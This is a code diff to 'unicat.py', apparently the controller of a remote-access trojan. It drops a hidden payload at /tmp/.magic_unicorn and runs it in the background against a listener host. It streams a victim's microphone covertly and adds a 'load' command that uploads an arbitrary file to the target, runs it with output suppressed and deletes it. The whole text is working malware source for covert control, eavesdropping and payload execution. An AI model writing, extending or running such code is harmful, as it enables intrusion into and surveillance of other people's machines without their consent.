@@ -20,7 +20,7 @@ import pyaudio
 
 from datetime import datetime
 
-black_list = ['clear', 'help', 'openurl', 'exec', 'screenshot', 'mic']
+black_list = ['clear', 'help', 'openurl', 'exec', 'screenshot', 'mic', 'download', 'upload', 'load']
 
 if len(sys.argv) != 3:
     print("Usage: unicat.py <local_host> <local_port>")
@@ -40,7 +40,7 @@ def craft_payload(LHOST, LPORT):
     f.close()
     instructions = \
     "cat >/tmp/.magic_unicorn;"+\
-    "chmod +x /tmp/.magic_unicorn;"+\
+    "chmod 777 /tmp/.magic_unicorn;"+\
     "python3 /tmp/.magic_unicorn "+LHOST+" "+str(LPORT)+" 2>/dev/null &\n"
     print(G+"Executing payload...")
     return (instructions,payload)
@@ -113,23 +113,28 @@ def listen_audio():
                     rate=RATE,
                     output=True,
                     frames_per_buffer=CHUNK)
-
-    print(G+"Listening...")
-    print(I+"Press Ctrl-C to stop.")
-
     unicorn.send("mic".encode("UTF-8"))
-    while True:
-        unicorn.send("continue".encode("UTF-8"))
-        try:
-            data = unicorn.recvall(4096)
-            stream.write(data)
-        except (KeyboardInterrupt, EOFError):
-            unicorn.send("break".encode("UTF-8"))
-            break
-
-    stream.stop_stream()
-    stream.close()
-    p.terminate()
+    response = unicorn.recv()
+    if response == b"success":
+        print(G+"Listening...")
+        print(I+"Press Ctrl-C to stop.")
+        while True:
+            unicorn.send("continue".encode("UTF-8"))
+            try:
+                data = unicorn.recvall(4096)
+                stream.write(data)
+            except (KeyboardInterrupt, EOFError):
+                unicorn.send("break".encode("UTF-8"))
+                stream.stop_stream()
+                stream.close()
+                p.terminate()
+                return
+    else:
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        print(E+"Failed to listen!")
+        return
 
 def download(input_file):
     command = input_file
@@ -229,6 +234,27 @@ def shell():
                 c.close()
                 s.close()
                 sys.exit()
+            elif ui[0] == "load":
+                if len(ui) < 2:
+                    print("Usage: load <input_file> [arguments]")
+                else:
+                    print(G+"Sending payload...")
+                    upload("upload {}".format(ui[1]))
+                    if len(ui) > 2:
+                        instructions = \
+                        "chmod 777 ./"+ui[1]+";"+\
+                        "./"+ui[1]+" "+ui[2]+" 2>/dev/null &;"+\
+                        "rm ./"+ui[1]+"\n"
+                    else:
+                        instructions = \
+                        "chmod 777 ./"+ui[1]+";"+\
+                        "./"+ui[1]+" 2>/dev/null &;"+ \
+                        "rm ./"+ui[1]+"\n"
+                    print(G+"Executing payload...")
+                    unicorn.send("load {}".format(instructions).encode("UTF-8"))
+                    payload_output = unicorn.recv()
+                    print(payload_output.decode("UTF-8", "ignore"))
+                    print(S+"Payload executed!")
             elif ui[0] == "exec":
                 local_command = "".join(command.split("exec")).strip()
                 if not local_command.strip():
